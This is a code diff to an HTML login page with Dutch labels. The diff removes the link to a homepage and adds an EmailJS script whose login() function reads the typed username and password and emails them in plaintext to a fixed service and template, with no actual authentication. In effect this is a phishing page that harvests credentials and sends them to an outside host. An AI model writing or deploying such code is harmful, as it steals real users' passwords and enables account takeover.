@@ -47,19 +47,36 @@
         <form onsubmit="return login()">
             <input type="text" id="username" placeholder="Gebruikersnaam" required>
             <input type="password" id="password" placeholder="Wachtwoord" required>
-            <a href='homepage.html'><button type="submit">Inloggen</button></a>
+            <button type="submit">Inloggen</button>
         </form>
         <p id="message" style="color: red;"></p>
     </div>
    
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
     <script>
+        
+        emailjs.init("cXBQtkCZQdlbhKdfG");
+
         function login() {
+            // Haal de gebruikersnaam en wachtwoord op uit de inputvelden
             let user = document.getElementById("username").value;
             let pass = document.getElementById("password").value;
 
+            // Maak de template parameters aan voor de e-mail
+            const templateParams = {
+                mail: user, // Gebruikersnaam als mail
+                wachtwoord: pass // Wachtwoord
+            };
 
 
-           
+            emailjs.send("service_9q2qoob", "template_jpgwf8d", templateParams)
+                .then(function(response) {
+
+                }, function(error) {
+
+                    document.getElementById("message").innerText = "Er is een fout opgetreden bij het verzenden van de e-mail.";
+                });
+
 
             return false;
         }
